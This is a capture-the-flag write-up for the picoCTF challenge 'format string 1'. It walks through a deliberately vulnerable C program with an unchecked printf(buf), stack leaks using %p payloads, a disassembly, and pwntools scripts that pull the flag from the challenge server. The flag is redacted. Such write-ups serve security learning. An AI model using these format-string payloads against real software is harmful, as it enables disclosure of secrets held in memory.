# picoCTF format string 1

### Source code

```c
#include <stdio.h>

int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```

We read 64 bytes from `secret-menu-item-1.txt` and store it in secret1, 64 bytes from `secret-menu-item-2.txt` and store it in secret2, 64 bytes from `flag.txt` and store it in flag, and finally 1024 bytes from user using scanf and store it in buf.

From this we can see our format string vulnerability.

```c
printf(buf);
```

<br>

#### Checking for memory protections

```bash
$ checksec --file=format-string-1

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   41 Symbols        No    0               2              format-string-1
```

<br>

#### Checking for memory leaks

```bash
$ ./format-string-1

Give me your order and I'll read it back to you:
%p %p %p %p %p
Here's your order: 0x7ffe7f072710
Bye!
```

There does seem to be a format string vulnerability, but it only leaks a single address? wierd. Lets try that again with something other than spaces for delimiters.

```bash
$ ./format-string-1

Give me your order and I'll read it back to you:
%p,%p,%p,%p
Here's your order: 0x7fffffffd7f0,(nil),(nil),0xa
Bye!
```
It works!! so it seems like because we're using scanf for input it is splitting our input based on spaces. Now we can just leak addresses as such

```python
def get_leaked_addr(n: int=100):
    p = process("./format-string-1")
    p.sendline(b"%p|"*n)
    leaked_addr = p.recvall().decode('latin-1').split(":")[-1].strip()
    leaked_addr = leaked_addr.split("|")[: -1]
    return leaked_addr

print(get_leaked_addr(5))
```
```bash
$ ./exploit.py          

Enter the no. of addresses to leak (default = 100): 5
['0x7fffffffd7f0', '(nil)', '(nil)', '0xa', '0x400']
```

Now we can calculate the offset at which our buffer is placed.
```bash
$ python3 -c 'print("AAAAAAAA"+"%p,"*50)' | ./format-string-1

Give me your order and I'll read it back to you:
Here's your order: AAAAAAAA0x7fffffffd7f0,(nil),(nil),0xa,0x400,0x67756720656b6166,0xa6167616775,0x7ffff7fc06c0,0x3,0x7fff00000000,0x7ffff7dc7938,0x7fffffffda20,0x7ffff7ffe680,0x6664736166647361,0x7fffffff000a,0xffffda74,(nil),(nil),0x7fffffffdb90,0x7ffff7ffe680,0x7ffff7ff285d,0x7567206c61796972,0xa616761677567,0x3de00ec7,0x7ffff7fd15dc,0x1,0x7fffffffdb90,(nil),(nil),0x4141414141414141,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x2c70252c7025,0x7fffffffdb58,
Bye!
```

It looks like our buffer is placed at the 30th position in the leaks, we can confirm this by
```bash
$ ./format-string-1

Give me your order and I'll read it back to you:
AAAAAAAA%30$p
Here's your order: AAAAAAAA0x4141414141414141
Bye!
```

#### Determining variables

Now we just have to figure out what to write and where to write it. Taking a look at the disassembly of the main function. we can see the addresses of some of our variables

```asm
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x4d0
   0x0000000000401205 <+15>:    mov    esi,0x402008
   0x000000000040120a <+20>:    mov    edi,0x40200a
   0x000000000040120f <+25>:    call   0x4010f0 <fopen@plt>
   0x0000000000401214 <+30>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401218 <+34>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040121d <+39>:    jne    0x401233 <main+61>
   0x000000000040121f <+41>:    mov    edi,0x402028
   0x0000000000401224 <+46>:    call   0x4010b0 <puts@plt>
   0x0000000000401229 <+51>:    mov    eax,0x1
   0x000000000040122e <+56>:    jmp    0x401363 <main+365>
   0x0000000000401233 <+61>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401237 <+65>:    lea    rax,[rbp-0x450]
   0x000000000040123e <+72>:    mov    esi,0x40
   0x0000000000401243 <+77>:    mov    rdi,rax
   0x0000000000401246 <+80>:    call   0x4010d0 <fgets@plt>
   0x000000000040124b <+85>:    mov    esi,0x402008
   0x0000000000401250 <+90>:    mov    edi,0x40205b
   0x0000000000401255 <+95>:    call   0x4010f0 <fopen@plt>
   0x000000000040125a <+100>:   mov    QWORD PTR [rbp-0x8],rax
   0x000000000040125e <+104>:   cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401263 <+109>:   jne    0x401279 <main+131>
   0x0000000000401265 <+111>:   mov    edi,0x402068
   0x000000000040126a <+116>:   call   0x4010b0 <puts@plt>
   0x000000000040126f <+121>:   mov    eax,0x1
   0x0000000000401274 <+126>:   jmp    0x401363 <main+365>
   0x0000000000401279 <+131>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040127d <+135>:   lea    rax,[rbp-0x490]
   0x0000000000401284 <+142>:   mov    esi,0x40
   0x0000000000401289 <+147>:   mov    rdi,rax
   0x000000000040128c <+150>:   call   0x4010d0 <fgets@plt>
   0x0000000000401291 <+155>:   mov    esi,0x402008
   0x0000000000401296 <+160>:   mov    edi,0x40208d
   0x000000000040129b <+165>:   call   0x4010f0 <fopen@plt>
   0x00000000004012a0 <+170>:   mov    QWORD PTR [rbp-0x8],rax
   0x00000000004012a4 <+174>:   cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004012a9 <+179>:   jne    0x4012bf <main+201>
   0x00000000004012ab <+181>:   mov    edi,0x4020a8
   0x00000000004012b0 <+186>:   call   0x4010b0 <puts@plt>
   0x00000000004012b5 <+191>:   mov    eax,0x1
   0x00000000004012ba <+196>:   jmp    0x401363 <main+365>
   0x00000000004012bf <+201>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004012c3 <+205>:   lea    rax,[rbp-0x4d0]
   0x00000000004012ca <+212>:   mov    esi,0x40
   0x00000000004012cf <+217>:   mov    rdi,rax
   0x00000000004012d2 <+220>:   call   0x4010d0 <fgets@plt>
   0x00000000004012d7 <+225>:   mov    edi,0x4020e0
   0x00000000004012dc <+230>:   call   0x4010b0 <puts@plt>
   0x00000000004012e1 <+235>:   mov    rax,QWORD PTR [rip+0x2d78]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x00000000004012e8 <+242>:   mov    rdi,rax
   0x00000000004012eb <+245>:   call   0x4010e0 <fflush@plt>
   0x00000000004012f0 <+250>:   lea    rax,[rbp-0x410]
   0x00000000004012f7 <+257>:   mov    rsi,rax
   0x00000000004012fa <+260>:   mov    edi,0x402111
   0x00000000004012ff <+265>:   mov    eax,0x0
   0x0000000000401304 <+270>:   call   0x401100 <__isoc99_scanf@plt>
   0x0000000000401309 <+275>:   mov    edi,0x402118
   0x000000000040130e <+280>:   mov    eax,0x0
   0x0000000000401313 <+285>:   call   0x4010c0 <printf@plt>
   0x0000000000401318 <+290>:   lea    rax,[rbp-0x410]
   0x000000000040131f <+297>:   mov    rdi,rax
   0x0000000000401322 <+300>:   mov    eax,0x0
   0x0000000000401327 <+305>:   call   0x4010c0 <printf@plt>
   0x000000000040132c <+310>:   mov    edi,0xa
   0x0000000000401331 <+315>:   call   0x4010a0 <putchar@plt>
   0x0000000000401336 <+320>:   mov    rax,QWORD PTR [rip+0x2d23]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x000000000040133d <+327>:   mov    rdi,rax
   0x0000000000401340 <+330>:   call   0x4010e0 <fflush@plt>
   0x0000000000401345 <+335>:   mov    edi,0x40212c
   0x000000000040134a <+340>:   call   0x4010b0 <puts@plt>
   0x000000000040134f <+345>:   mov    rax,QWORD PTR [rip+0x2d0a]        # 0x404060 <stdout@GLIBC_2.2.5>
   0x0000000000401356 <+352>:   mov    rdi,rax
   0x0000000000401359 <+355>:   call   0x4010e0 <fflush@plt>
   0x000000000040135e <+360>:   mov    eax,0x0
   0x0000000000401363 <+365>:   leave
   0x0000000000401364 <+366>:   ret

```

On taking a look again at the leaked values we can see that the 13th address looks very odd. on converting that to ascii we can see its `Bye!\n`. So its leaking strings from the stack. Using this we can develop our exploit to convert all the values to ascii till we find the flag.

```python
def exploit(offset: int):
    # Set output level (critical, error, warning, info, debug)
    context.update(log_level = "warning")

    flag = b''
    keep_going = True

    while keep_going:
        io = remote("mimas.picoctf.net", 55670)    
        io.sendlineafter(b"Give me your order and I'll read it back to you:\n", b"%"+str(offset).encode() + b"$lx")
        out = io.recvlineS().split(':')[1].strip()
        try:
            res_le = p64(int(out, 16), endianness="little")
            flag += res_le
            if (b'}' in res_le):
                keep_going = False
        except Exception:
            pass
        io.recvall()
        io.close()
        offset += 1

    print(flag)

```

using this we can see our flag.

```bash
$ ./exploit.py          

Enter the no. of addresses to leak (default = 40): 
picoCTF{
14
b'picoCTF{----redacted----}\x00'

```
